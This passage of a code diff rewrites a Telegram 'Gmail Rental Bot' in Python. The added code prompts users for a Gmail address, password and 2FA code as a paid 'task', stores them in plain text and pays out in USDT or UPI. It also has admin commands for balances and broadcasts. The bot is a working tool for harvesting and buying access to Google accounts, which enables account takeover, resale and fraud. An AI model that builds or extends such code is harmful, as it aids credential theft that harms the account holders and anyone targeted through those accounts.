-        "• <code>/clear_bal USER_ID</code> - Reset whole user balance to 0\n\n"
-        "📢 <b>Communication:</b>\n"
-        "• <code>/broadcast Message</code> - Broadcast message to all users\n"
-        "• <code>/msg USER_ID Message</code> - Send direct message to specific user"
-    )
-    bot.send_message(ADMIN_ID, panel_text)
-
-@bot.message_handler(commands=['task_active', 'task_deactive'])
-def toggle_task_status(message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    try:
-        cmd, tid = message.text.split()
-        if tid in db["tasks"]:
-            new_status = "Active" if cmd == "/task_active" else "Offline"
-            db["tasks"][tid]["status"] = new_status
-            if new_status == "Active":
-                db["tasks"][tid]["last_updated"] = time.time()
-            save_data(db)
-            bot.reply_to(message, f"✅ Task <code>{tid}</code> status set to <b>{new_status}</b>.")
-        else:
-            bot.reply_to(message, "❌ Task ID not found.")
-    except Exception:
-        bot.reply_to(message, "Usage: <code>/task_active TASK_ID</code>")
-
-@bot.message_handler(commands=['add_task_bal', 'rem_task_bal'])
-def manage_task_balance(message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    try:
-        cmd, tid, amt = message.text.split()
-        amt = float(amt)
-        if tid in db["tasks"]:
-            t = db["tasks"][tid]
-            uid = t["user_id"]
-            if cmd == "/add_task_bal":
-                t["earned"] = t.get("earned", 0.0) + amt
-                db["users"][uid]["balance"] += amt
-                t["last_updated"] = time.time()  # Reset 6h timer on manual update
-            else:
-                t["earned"] = max(0.0, t.get("earned", 0.0) - amt)
-                db["users"][uid]["balance"] = max(0.0, db["users"][uid]["balance"] - amt)
+        if task and task["status"] == "Pending":
+            task["status"] = "Rejected"
+            user_id = task["user_id"]
             
-            save_data(db)
-            bot.reply_to(message, f"✅ Updated Task <code>{tid}</code> balance by ₹{amt}. User total updated.")
-        else:
-            bot.reply_to(message, "❌ Task ID not found.")
-    except Exception:
-        bot.reply_to(message, "Usage: <code>/add_task_bal TASK_ID AMOUNT</code>")
+            await query.message.edit_text(
+                f"{query.message.text}\n\n❌ 𝗧𝗮𝘀𝗸 𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱",
+                parse_mode="Markdown"
+            )
+            await context.bot.send_message(
+                chat_id=user_id,
+                text="❌ 𝗬𝗼𝘂 𝘁𝗮𝘀𝗸 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗷𝗲𝗰𝘁𝗲𝗱 𝗽𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 𝗼𝘂𝗿 𝗮𝗱𝗺𝗶𝗻 𝗳𝗼𝗿 𝗮𝗽𝗽𝗿𝗼𝘃𝗲 @SUDEBNOMERCY"
+            )
 
-@bot.message_handler(commands=['add_bal', 'rem_bal', 'clear_bal'])
-def manage_user_whole_balance(message):
-    if message.from_user.id != ADMIN_ID:
+# ----------------- MENU HANDLERS -----------------
+async def handle_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text
+    user_id = update.effective_user.id
+    init_user(user_id)
+
+    if text == "𝟮) 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗵𝗶𝘀𝘁𝗼𝗿𝘆":
+        user_tasks = users_db[user_id]["tasks"]
+        if not user_tasks:
+            await update.message.reply_text("📑 𝗡𝗼 𝘀𝘂𝗯𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝗵𝗶𝘀𝘁𝗼𝗿𝘆 𝗳𝗼𝘂𝗻𝗱.")
+            return
+
+        msg = "📑 𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝗛𝗶𝘀𝘁𝗼𝗿𝘆:\n\n"
+        for tid in user_tasks:
+            t = tasks_db[tid]
+            status_icon = "⏳" if t["status"] == "Pending" else ("✅" if t["status"] == "Accepted" else "❌")
+            msg += (
+                f"🆔 𝗧𝗮𝘀𝗸 𝗜𝗗: `{tid}`\n"
+                f"✉️ 𝗚𝗺𝗮𝗶𝗹: `{t['gmail']}`\n"
+                f"🔑 𝗣𝗮𝘀𝘀: `{t['pass']}`\n"
+                f"🛡️ 𝟮𝗙𝗔: `{t['2fa']}`\n"
+                f"📊 𝗦𝘁𝗮𝘁𝘂𝘀: {status_icon} {t['status']}\n"
+                f"-----------------------------\n"
+            )
+        await update.message.reply_text(msg, parse_mode="Markdown")
+
+    elif text == "𝟯) 𝗕𝗮𝗹𝗮𝗻𝗰𝗲":
+        bal = users_db[user_id]["balance"]
+        await update.message.reply_text(f"💰 𝗬𝗼𝘂𝗿 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: *${bal:.2f}*", parse_mode="Markdown")
+
+    elif text == "𝟰) 𝗪𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹":
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("💵 𝗨𝗦𝗗𝗧 (𝗕𝗘𝗣𝟮𝟬)", callback_data="w_usdt")],
+            [InlineKeyboardButton("💳 𝗨𝗣𝗜", callback_data="w_upi")]
+        ])
+        await update.message.reply_text("💳 𝗦𝗲𝗹𝗲𝗰𝘁 𝘆𝗼𝘂𝗿 𝘄𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗺𝗲𝘁𝗵𝗼𝗱:", reply_markup=keyboard)
+
+    elif text == "𝟱) 𝗦𝘂𝗽𝗽𝗼𝗿𝘁":
+        await update.message.reply_text("📞 𝗙𝗼𝗿 𝗮𝗻𝘆 𝗵𝗲𝗹𝗽 𝗼𝗿 𝘀𝘂𝗽𝗽𝗼𝗿𝘁, 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗱𝗺𝗶𝗻: @SUDEBNOMERCY")
+
+# ----------------- WITHDRAWAL FLOW -----------------
+async def handle_withdrawal_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+
+    if query.data == "w_upi":
+        await query.message.reply_text("𝗙𝗼𝗿 𝘂𝗽𝗶 𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝘆𝗼𝘂 𝗺𝘂𝘀𝘁 𝗵𝗮𝘃𝗲 𝘁𝗼 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗱𝗺𝗶𝗻 @SUDEBNOMERCY")
+    elif query.data == "w_usdt":
+        user_id = query.from_user.id
+        if users_db[user_id]["balance"] < 0.32:
+            await query.message.reply_text("⚠️ 𝗠𝗶𝗻𝗶𝗺𝘂𝗺 𝘄𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗮𝗺𝗼𝘂𝗻𝘁 𝗶𝘀 $𝟬.𝟯𝟮")
+            return
+        await query.message.reply_text("💵 𝗘𝗻𝘁𝗲𝗿 𝘄𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗮𝗺𝗼𝘂𝗻𝘁 (𝗠𝗶𝗻𝗶𝗺𝘂𝗺 $𝟬.𝟯𝟮):")
+        return USDT_AMOUNT
+
+async def get_usdt_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    try:
+        amount = float(update.message.text.strip())
+        if amount < 0.32:
+            await update.message.reply_text("⚠️ 𝗠𝗶𝗻𝗶𝗺𝘂𝗺 𝘄𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗶𝘀 $𝟬.𝟯𝟮. 𝗧𝗿𝘆 𝗮𝗴𝗮𝗶𝗻:")
+            return USDT_AMOUNT
+        if amount > users_db[user_id]["balance"]:
+            await update.message.reply_text("❌ 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗯𝗮𝗹𝗮𝗻𝗰𝗲. 𝗧𝗿𝘆 𝗮𝗴𝗮𝗶𝗻:")
+            return USDT_AMOUNT
+
+        context.user_data["w_amount"] = amount
+        await update.message.reply_text("📍 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 𝗨𝗦𝗗𝗧 𝗕𝗘𝗣𝟮𝟬 𝘄𝗮𝗹𝗹𝗲𝘁 𝗮𝗱𝗱𝗿𝗲𝘀𝘀:")
+        return USDT_ADDRESS
+    except ValueError:
+        await update.message.reply_text("⚠️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿:")
+        return USDT_AMOUNT
+
+async def get_usdt_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    address = update.message.text.strip()
+    amount = context.user_data["w_amount"]
+
+    users_db[user_id]["balance"] -= amount
+
+    await update.message.reply_text(
+        f"✅ 𝗪𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗿𝗲𝗾𝘂𝗲𝘀𝘁 𝘀𝘂𝗯𝗺𝗶𝘁𝘁𝗲𝗱!\n\n"
+        f"💰 𝗔𝗺𝗼𝘂𝗻𝘁: ${amount}\n"
+        f"📍 𝗔𝗱𝗱𝗿𝗲𝘀𝘀: `{address}`\n"
+        f"⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 𝗳𝗼𝗿 𝗮𝗱𝗺𝗶𝗻 𝗽𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴.",
+        parse_mode="Markdown"
+    )
+
+    await context.bot.send_message(
+        chat_id=ADMIN_ID,
+        text=(
+            f"🚨 𝗡𝗲𝘄 𝗨𝗦𝗗𝗧 𝗪𝗶𝘁𝗵𝗱𝗿𝗮𝘄𝗮𝗹 𝗥𝗲𝗾𝘂𝗲𝘀𝘁\n\n"
+            f"👤 𝗨𝘀𝗲𝗿 𝗜𝗗: `{user_id}`\n"
+            f"💰 𝗔𝗺𝗼𝘂𝗻𝘁: `${amount}`\n"
+            f"📍 𝗕𝗘𝗣𝟮𝟬 𝗔𝗱𝗱𝗿𝗲𝘀𝘀: `{address}`"
+        ),
+        parse_mode="Markdown"
+    )
+    return ConversationHandler.END
+
+# ----------------- ADMIN COMMANDS -----------------
+async def admin_add_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
         return
     try:
-        parts = message.text.split()
-        cmd, uid = parts[0], parts[1]
-        
-        if uid in db["users"]:
-            if cmd == "/clear_bal":
-                db["users"][uid]["balance"] = 0.0
-                bot.reply_to(message, f"✅ User <code>{uid}</code> total balance reset to 0.")
+        _, uid, amt = update.message.text.split()
+        uid, amt = int(uid), float(amt)
+        init_user(uid)
+        users_db[uid]["balance"] += amt
+        await update.message.reply_text(f"✅ 𝗔𝗱𝗱𝗲𝗱 ${amt} 𝘁𝗼 𝘂𝘀𝗲𝗿 `{uid}`. 𝗡𝗲𝘄 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: ${users_db[uid]['balance']:.2f}")
+        await context.bot.send_message(chat_id=uid, text=f"💰 ${amt} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗮𝗱𝗱𝗲𝗱 𝘁𝗼 𝘆𝗼𝘂𝗿 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 𝗯𝘆 𝗮𝗱𝗺𝗶𝗻.")
+    except Exception:
+        await update.message.reply_text("⚠️ 𝗨𝘀𝗮𝗴𝗲: `/addbal <user_id> <amount>`")
+
+async def admin_remove_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return
+    try:
+        _, uid, amt = update.message.text.split()
+        uid, amt = int(uid), float(amt)
+        init_user(uid)
+        users_db[uid]["balance"] = max(0.0, users_db[uid]["balance"] - amt)
+        await update.message.reply_text(f"✅ 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 ${amt} 𝗳𝗿𝗼𝗺 𝘂𝘀𝗲𝗿 `{uid}`. 𝗡𝗲𝘄 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: ${users_db[uid]['balance']:.2f}")
+    except Exception:
+        await update.message.reply_text("⚠️ 𝗨𝘀𝗮𝗴𝗲: `/removebal <user_id> <amount>`")
+
+# ----------------- BROADCAST -----------------
+async def broadcast_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return ConversationHandler.END
+    await update.message.reply_text("📢 𝗦𝗲𝗻𝗱 𝗺𝗲 𝘁𝗵𝗲 𝗽𝗿𝗼𝗺𝗼𝘁𝗶𝗼𝗻𝗮𝗹 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗼𝗿 𝗰𝗮𝗽𝘁𝗶𝗼𝗻:")
+    return BC_MSG
+
+async def broadcast_get_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data["bc_text"] = update.message.text
+    await update.message.reply_text("🖼️ 𝗦𝗲𝗻𝗱 𝗺𝗲 𝘁𝗵𝗲 𝗶𝗺𝗮𝗴𝗲 (𝗼𝗿 𝘁𝘆𝗽𝗲 '𝘀𝗸𝗶𝗽' 𝘁𝗼 𝘀𝗲𝗻𝗱 𝘁𝗲𝘅𝘁 𝗼𝗻𝗹𝘆):")
+    return BC_IMG
+
+async def broadcast_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = context.user_data.get("bc_text", "")
+    photo = update.message.photo[-1].file_id if update.message.photo else None
+    
+    count = 0
+    for uid in users_db.keys():
+        try:
+            if photo:
+                await context.bot.send_photo(chat_id=uid, photo=photo, caption=text)
             else:
-                amt = float(parts[2])
-                if cmd == "/add_bal":
-                    db["users"][uid]["balance"] += amt
-                else:
-                    db["users"][uid]["balance"] = max(0.0, db["users"][uid]["balance"] - amt)
-                bot.reply_to(message, f"✅ User <code>{uid}</code> balance modified by ₹{amt}.")
-            save_data(db)
-        else:
-            bot.reply_to(message, "❌ User ID not found.")
-    except Exception:
-        bot.reply_to(message, "Usage: <code>/add_bal USER_ID AMOUNT</code>")
+                await context.bot.send_message(chat_id=uid, text=text)
+            count += 1
+        except Exception:
+            continue
 
-@bot.message_handler(commands=['msg'])
-def direct_person_msg(message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    try:
-        parts = message.text.split(maxsplit=2)
-        target_uid = parts[1]
-        msg_text = parts[2]
+    await update.message.reply_text(f"✅ 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝘀𝗲𝗻𝘁 𝘁𝗼 {count} 𝘂𝘀𝗲𝗿𝘀.")
+    return ConversationHandler.END
 
-        bot.send_message(target_uid, f"💬 <b>Message from Admin:</b>\n\n{msg_text}")
-        bot.reply_to(message, f"✅ Direct message sent to user <code>{target_uid}</code>.")
-    except Exception:
-        bot.reply_to(message, "Usage: <code>/msg USER_ID Your Message Here</code>")
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("❌ 𝗢𝗽𝗲𝗿𝗮𝘁𝗶𝗼𝗻 𝗰𝗮𝗻𝗰𝗲𝗹𝗹𝗲𝗱.")
+    return ConversationHandler.END
 
-@bot.message_handler(commands=['broadcast'])
-def broadcast_msg(message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    try:
-        b_text = message.text.split(maxsplit=1)[1]
-        sent, failed = 0, 0
-        for uid in db["users"].keys():
-            try:
-                bot.send_message(uid, f"📢 <b>ANNOUNCEMENT</b>\n\n{b_text}")
-                sent += 1
-            except Exception:
-                failed += 1
-        bot.reply_to(message, f"📢 <b>Broadcast Complete!</b>\n\n✅ Delivered: {sent}\n❌ Failed: {failed}")
-    except Exception:
-        bot.reply_to(message, "Usage: <code>/broadcast Your Announcement Text</code>")
+# ----------------- MAIN APP -----------------
+def main():
+    app = Application.builder().token(BOT_TOKEN).build()
 
-# ==================== BOT LAUNCH ====================
+    task_conv = ConversationHandler(
+        entry_points=[MessageHandler(filters.Regex("^𝟭\) 𝗧𝗮𝘀𝗸$"), start_task)],
+        states={
+            GMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_task_gmail)],
+            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_task_password)],
+            TWO_FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_task_2fa)],
+        },
+        fallbacks=[CommandHandler("cancel", cancel)]
+    )
+
+    usdt_conv = ConversationHandler(
+        entry_points=[CallbackQueryHandler(handle_withdrawal_choice, pattern="^w_usdt$")],
+        states={
+            USDT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_usdt_amount)],
+            USDT_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_usdt_address)],
+        },
+        fallbacks=[CommandHandler("cancel", cancel)]
+    )
+
+    bc_conv = ConversationHandler(
+        entry_points=[CommandHandler("broadcast", broadcast_start)],
+        states={
+            BC_MSG: [MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_get_msg)],
+            BC_IMG: [
+                MessageHandler(filters.PHOTO, broadcast_send),
+                MessageHandler(filters.Regex("(?i)^skip$"), broadcast_send)
+            ],
+        },
+        fallbacks=[CommandHandler("cancel", cancel)]
+    )
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("addbal", admin_add_balance))
+    app.add_handler(CommandHandler("removebal", admin_remove_balance))
+    app.add_handler(CallbackQueryHandler(check_join_callback, pattern="^check_join$"))
+    app.add_handler(CallbackQueryHandler(admin_task_actions, pattern="^(adm_|pay_)"))
+    app.add_handler(CallbackQueryHandler(handle_withdrawal_choice, pattern="^w_upi$"))
+    app.add_handler(task_conv)
+    app.add_handler(usdt_conv)
+    app.add_handler(bc_conv)
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_menu))
+
+    print("Bot is starting...")
+    app.run_polling()
+
 if __name__ == "__main__":
-    print("🤖 Gmail Rental Bot Running Clean on Render...")
-    bot.infinity_polling(skip_pending=True)
+    main()
